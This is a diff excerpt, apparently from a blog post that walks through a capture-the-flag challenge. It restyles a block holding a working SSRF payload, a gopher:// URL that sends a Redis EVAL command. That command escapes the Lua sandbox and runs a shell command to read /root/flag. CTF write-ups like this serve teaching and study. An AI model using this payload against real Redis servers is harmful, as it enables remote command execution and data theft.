@@ -239,7 +239,9 @@ The response from the challenge server confirms we have full-blown RCE (remember
 
  From here it is a straightforward stroll to the finish. Enumerate the filesystem and find the flag file in /root (surprise surprise). cat the flag file and submit for those sweet points.
 
-<div style={{ textAlign: "center", paddingBottom: "1rem" }}>`gopher://127.0.0.1:6379/_%2A3%0D%0A%244%0D%0AEVAL%0D%0A%24197%0D%0Alocal%20io_l%20%3D%20package.loadlib%28%27/usr/lib/x86_64-linux-gnu/liblua5.1.so.0%27%2C%20%27luaopen_io%27%29%3B%0Alocal%20io%20%3D%20io_l%28%29%3B%20local%20f%20%3D%20io.popen%28%27cat%20/root/flag%27%2C%20%27r%27%29%3B%20local%20res%20%3D%20f%3Aread%28%27%2Aa%27%29%3B%20f%3Aclose%28%29%3B%20return%20res%0D%0A%241%0D%0A0%0D%0A%2A1%0D%0A%244%0D%0AQUIT%0D%0A `</div>
+<div className="centered">
+    `gopher://127.0.0.1:6379/_%2A3%0D%0A%244%0D%0AEVAL%0D%0A%24197%0D%0Alocal%20io_l%20%3D%20package.loadlib%28%27/usr/lib/x86_64-linux-gnu/liblua5.1.so.0%27%2C%20%27luaopen_io%27%29%3B%0Alocal%20io%20%3D%20io_l%28%29%3B%20local%20f%20%3D%20io.popen%28%27cat%20/root/flag%27%2C%20%27r%27%29%3B%20local%20res%20%3D%20f%3Aread%28%27%2Aa%27%29%3B%20f%3Aclose%28%29%3B%20return%20res%0D%0A%241%0D%0A0%0D%0A%2A1%0D%0A%244%0D%0AQUIT%0D%0A `
+</div>
 
 <Image 
     src="/blog-images/cactf-red-island/rce-cat-flag.png"
